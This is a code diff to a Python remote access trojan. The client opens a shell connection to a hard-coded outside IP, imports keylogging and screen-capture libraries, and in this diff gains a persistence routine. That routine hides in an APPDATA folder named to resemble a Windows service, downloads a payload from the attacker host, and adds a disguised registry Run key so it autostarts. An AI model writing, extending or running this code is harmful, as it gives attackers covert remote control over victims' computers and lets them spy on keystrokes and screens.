@@ -1,4 +1,3 @@
-import random
 import socket
 import subprocess
 import os
@@ -18,11 +17,13 @@ import re
 import pyautogui
 import cv2
 import urllib.request
+import urllib
 import json
 from pynput.keyboard import Listener
 from pynput.mouse import Controller
 import time
 import keyboard
+import requests
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
@@ -43,7 +44,6 @@ class RAT_CLIENT:
         self.host = host
         self.port = port
         self.curdir = os.getcwd()
-        # print(f'Host: {self.host}\nPort: {self.port}\n')
 
     def build_connection(self):
         global s
@@ -94,11 +94,11 @@ class RAT_CLIENT:
 
     def execute(self):
         while True:
-            command = s.recv(1024).decode()
+            command = s.recv(2048).decode()
 
             if command == 'shell':
                 while 1:
-                    command = s.recv(1024).decode()
+                    command = s.recv(2048).decode()
                     if command.lower() == 'exit':
                         break
                     if command == 'cd':
@@ -650,6 +650,33 @@ class RAT_CLIENT:
 
 rat = RAT_CLIENT('50.116.8.102', 4444)
 
+def persist():
+    running_dir = os.getcwd()
+    if running_dir == f"{os.environ['APPDATA']}/Winget Management Service":
+        print('Persistence achieved...')
+        return True
+    else:
+        os.chdir(os.environ['APPDATA'])
+        try:
+            os.mkdir('Winget Management Service')
+            os.chdir('Winget Management Service')
+            response = requests.get('http://50.116.8.102/client.exe')
+            open('client_rewritten.py', 'wb').write(response.content)
+            command = f'REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "py {os.environ["APPDATA"]}/Winget Management Service/client.exe"'
+            print(command)
+            os.system(command)
+
+        except FileExistsError:
+            os.chdir('Winget Management Service')
+            persistent = os.path.exists('client_rewritten.py')
+            if not persistent:
+                response = requests.get('http://50.116.8.102/client.exe')
+                open('client_rewritten.py', 'wb').write(response.content)
+                print('File downloaded')
+                return True
+        os.chdir(running_dir)
+
 if __name__ == '__main__':
+    persist()
     rat.build_connection()
     rat.execute()
